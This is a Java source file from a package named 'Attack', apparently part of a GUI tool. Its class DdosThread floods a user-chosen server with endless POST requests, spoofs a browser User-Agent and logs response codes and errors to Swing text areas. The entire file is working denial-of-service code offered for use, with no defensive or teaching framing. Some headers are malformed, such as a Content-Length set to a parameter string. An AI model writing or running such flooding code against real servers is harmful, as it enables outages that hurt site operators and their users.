/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Attack;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;
import java.awt.TextArea;
import javax.swing.JLabel;
/**
 *
 * @author Estébane
 */
public class DdosThread extends Thread {
 
        private AtomicBoolean running = new AtomicBoolean(true);
        private String server = null;
        private String request = "";
        private final URL url;
        private String state = "";
        private TextArea cnxCode;
        private TextArea cnxInfo;
        private JLabel TTLTimer;
        String param = null;
        public static int nbrErreur = 1;
        public static int nbrCnx = 1;
 
        public DdosThread(String server, String port, String ressource, String query,
                TextArea zoneCode, TextArea zoneInfo, JLabel ttl ) throws Exception {
            if( !port.equals("") ){
                port = ":"+port;
            }
            if( !server.equals("") ){
                server = "http://" + server;
            }
            if( !ressource.equals("") ){
                ressource = "/" + ressource;
            }
            if( !query.equals("") ){
                query = "?" + query;
            }
            this.server = server;
            this.request =  server + "" + port + "" + ressource + query;
            url = new URL(request);
            this.param = "param1=" + URLEncoder.encode("87845", "UTF-8");
            this.cnxCode = zoneCode;
            this.cnxInfo = zoneInfo;
            this.TTLTimer = ttl;
            
        } 
        public String getStatus(){
            return this.state;
        }
        public String getUrl(){
            return this.url.toString();
        }
        @Override 
        public void run() { 
            while (running.get()) {
                try { 
                    attack();
                } catch (Exception e) {
                    //System.err.println( "Error: "+e.getMessage() );
                    this.cnxInfo.setText( this.cnxInfo.getText() + System.lineSeparator() + nbrErreur + ") " + "Error: " + e.getLocalizedMessage() );
                    nbrErreur++;
                    
                } 
            } 
        }
        public void attack() throws Exception {
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Host", "localhost");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("Content-Length", param);
            //System.out.println(this + " " + connection.getResponseCode());
            connection.getInputStream();
            this.nbrCnx++;
            this.cnxCode.setText( this.cnxCode.getText() +  System.lineSeparator() + this.nbrCnx + ") " +  this +" code: " +connection.getResponseCode() );
            this.TTLTimer.setText( Network.TTLComputer.TTLTimer(this.server) + "ms");
        } 
    } 
 
